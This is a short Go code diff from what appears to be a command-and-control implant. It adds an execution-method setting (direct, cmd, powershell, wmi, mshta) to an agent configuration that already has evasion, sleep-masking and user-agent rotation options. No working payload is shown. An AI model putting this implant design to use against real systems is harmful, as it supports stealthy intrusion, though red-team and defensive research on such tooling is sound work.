@@ -36,6 +36,10 @@ type AgentConfig struct {
 	EnableEvasion     bool
 	SleepMasking      bool
 	UserAgentRotation bool
+
+	// Execution method baked in at build time
+	// Supported: direct | cmd | powershell | wmi | mshta
+	ExecMethod string
 }
 
 // Agent is the main implant runtime
